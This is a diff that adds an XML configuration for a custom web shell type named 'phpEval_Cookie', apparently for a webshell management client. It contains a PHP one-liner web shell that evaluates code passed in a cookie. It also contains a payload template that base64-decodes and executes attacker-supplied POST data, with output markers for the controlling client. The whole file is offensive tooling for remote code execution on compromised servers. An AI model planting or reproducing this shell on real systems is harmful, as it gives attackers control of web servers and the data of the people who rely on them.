@@ -1,0 +1,12 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<customShellType>
+  <basicSetting>
+    <name>phpEval_Cookie</name>
+    <serviceExample><![CDATA[<?php @eval($_COOKIE[a])?>]]></serviceExample>
+	<mainCodeParam location="cookie" encrymode="None" >passwd</mainCodeParam>
+  </basicSetting>
+  <mainCodeSetting>
+	<funcCodeParam location="Body" encrymode="Base64" >funcCode</funcCodeParam>
+	<item><![CDATA[print("->|");eval(base64_decode($_POST[$funcCode$]));print("|<-");die();]]></item>
+  </mainCodeSetting>
+</customShellType>
